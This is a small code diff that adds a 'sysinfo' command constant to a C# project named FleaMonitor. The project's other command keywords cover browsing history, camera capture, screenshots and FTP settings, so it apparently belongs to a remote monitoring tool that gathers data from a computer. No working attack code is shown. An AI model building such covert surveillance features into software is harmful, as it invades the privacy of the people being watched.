@@ -25,6 +25,7 @@ namespace FleaMonitor.Auxiliary
         public const string QUIT_COMMAND = "quit";
         public const string SET_FTP_COMMAND = "setftp";
         public const string BROWSING_HISTORY_COMMAND = "history";
+        public const string GET_SYSTEM_INFO_COMMAND = "sysinfo";
         public const string GET_CAMERA_CAPTURE_COMMAND = "camera";
 
         private static readonly string SCREENSHOT_FILENAME = "screenshot.png";
